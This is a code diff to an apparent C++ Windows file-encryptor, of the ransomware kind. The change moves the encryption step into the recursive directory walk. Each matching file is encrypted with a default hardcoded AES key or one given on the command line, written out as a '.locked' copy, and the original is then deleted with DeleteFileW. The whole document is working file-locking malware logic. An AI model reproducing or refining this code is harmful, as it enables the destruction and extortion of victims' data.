@@ -1,13 +1,12 @@
 #include "encryptor.h"
 #include <shlwapi.h>
-#include <queue>
-
+#include <vector>
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "advapi32.lib")
 
 using namespace std;
 
-BOOL FindFile(const std::wstring &directory, wstring ext, queue<wstring> &results, DWORD& errCode)
+BOOL FindFile(const std::wstring &directory, wstring ext, const wchar_t* aeskey, DWORD& errCode)
 {
     // only local files - \\*
     std::wstring tmp = directory + L"\\*";
@@ -28,10 +27,19 @@ BOOL FindFile(const std::wstring &directory, wstring ext, queue<wstring> &result
             // FIX: oss << '\"' << fullBatchFileName << '\"';
             tmp = directory + L"\\" + std::wstring(file.cFileName);
             wcout << tmp << endl;
-            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
-              && PathMatchSpecW(file.cFileName, ext.c_str()))
-                results.push(tmp);
-           
+            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+              && PathMatchSpecW(file.cFileName, ext.c_str())) {
+
+                auto newFileName = (tmp + L".locked");
+                wcout << "[*] Encrypting " << tmp;
+                wcout << " to " << newFileName << endl;
+                encryptFile(
+                    tmp.c_str(), newFileName.c_str(),
+                    aeskey, false
+                );
+                DeleteFileW(tmp.c_str());
+                wcout << tmp << endl;
+            }           
 
             if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                 directories.push_back(tmp);
@@ -40,7 +48,7 @@ BOOL FindFile(const std::wstring &directory, wstring ext, queue<wstring> &result
         FindClose(search_handle);
 
         for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
-            FindFile(*iter, ext, results, errCode);
+            FindFile(*iter, ext, aeskey, errCode);
         return TRUE;
     } else {
         errCode = GetLastError();
@@ -75,35 +83,13 @@ int wmain(int argc, wchar_t** argv)
 
     wcout << argv[1] << endl;
     const wstring directoryPath = sanitizePath(argv[1]);
-    wcout << "now " << directoryPath << endl;
-    wcout << "dir path: " << directoryPath << endl;
-    queue<wstring> results;
 
     DWORD errCode = 0;
-    if (FindFile(directoryPath, L"", results, errCode) != TRUE) {
+    auto aeskey = (argc == 3 ? argv[2] : L"3igcZhRdWq96m3GUmTAiv9");
+    if (FindFile(directoryPath, L"", aeskey, errCode) != TRUE) {
         printNice(L"Some problem with the path provided ...");
         return 1;
     }
 
-    wstring(fileName);
-    wstring(newFileName);
-
-    auto aeskey = (argc == 3 ? argv[2] : L"3igcZhRdWq96m3GUmTAiv9");
-    while (results.size()) {
-        fileName = results.front();
-        newFileName = (fileName + L".locked");
-
-        wcout << "[*] Encrypting " << fileName;
-        wcout << "to " << newFileName << endl;
-        encryptFile(
-            fileName.c_str(), newFileName.c_str(),
-            aeskey, false
-        );
-
-        DeleteFileW(fileName.c_str());
-
-        wcout << fileName << endl;
-        results.pop();
-    }
     return 0;
 }
